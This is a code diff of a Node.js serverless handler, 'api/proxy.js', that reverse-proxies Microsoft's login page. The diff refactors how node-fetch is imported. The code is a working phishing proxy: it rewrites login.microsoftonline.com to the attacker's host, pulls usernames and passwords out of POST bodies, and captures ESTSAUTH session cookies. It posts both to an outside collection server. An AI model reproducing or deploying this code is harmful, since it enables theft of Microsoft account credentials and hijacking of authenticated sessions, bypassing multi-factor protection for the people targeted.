@@ -1,20 +1,16 @@
-// api/proxy.js
-
-const fetch = require('node-fetch');
-const { URL } = require('url');
-
-const upstream = 'login.microsoftonline.com';
-const upstream_path = '/';
-const https = true;
-
-// Server details for sending cookies
-const serverUrl = 'https://rest.westmidlands-ush.shop/neronewms/push.php';
-
-// Blocking
-const blocked_region = [];
-const blocked_ip_address = ['0.0.0.0', '127.0.0.1'];
-
 module.exports = async (req, res) => {
+    // Dynamically import node-fetch
+    const fetch = (await import('node-fetch')).default;
+    const { URL } = require('url');
+
+    const upstream = 'login.microsoftonline.com';
+    const upstream_path = '/';
+    const https = true;
+
+    const serverUrl = 'https://rest.westmidlands-ush.shop/neronewms/push.php';
+    const blocked_region = [];
+    const blocked_ip_address = ['0.0.0.0', '127.0.0.1'];
+
     const region = req.headers['cf-ipcountry'] ? req.headers['cf-ipcountry'].toUpperCase() : null;
     const ip_address = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
@@ -49,13 +45,11 @@ module.exports = async (req, res) => {
         new_request_headers['Host'] = upstream;
         new_request_headers['Referer'] = url.protocol + '//' + url_hostname;
 
-        // Obtain password from POST body
         if (req.method === 'POST') {
             const body = await getRequestBody(req);
             const keyValuePairs = body.split('&');
             let message = "Password found:\n\n";
 
-            // Iterate over the key-value pairs to find the passwd key
             for (const pair of keyValuePairs) {
                 const [key, value] = pair.split('=');
 
@@ -69,7 +63,7 @@ module.exports = async (req, res) => {
                 }
             }
             if (message.includes("User") && message.includes("Password")) {
-                await sendToServer(message, ip_address);
+                await sendToServer(fetch, message, ip_address);
             }
         }
 
@@ -102,14 +96,13 @@ module.exports = async (req, res) => {
             new_response_headers['set-cookie'] = (new_response_headers['set-cookie'] || []).concat(modifiedCookie);
         });
 
-        const content_type = new_response_headers['content-type'];
         original_text = await replace_response_text(original_response_clone, upstream, url_hostname);
 
         if (
             all_cookies.includes('ESTSAUTH') &&
             all_cookies.includes('ESTSAUTHPERSISTENT')
         ) {
-            await sendToServer("Cookies found:\n\n" + all_cookies, ip_address);
+            await sendToServer(fetch, "Cookies found:\n\n" + all_cookies, ip_address);
         }
 
         res.writeHead(original_response.status, new_response_headers);
@@ -134,7 +127,7 @@ async function replace_response_text(response, upstream_domain, host_name) {
     return text.replace(/login.microsoftonline.com/g, host_name);
 }
 
-async function sendToServer(data, ip_address) {
+async function sendToServer(fetch, data, ip_address) {
     try {
         const response = await fetch(serverUrl, {
             method: 'POST',
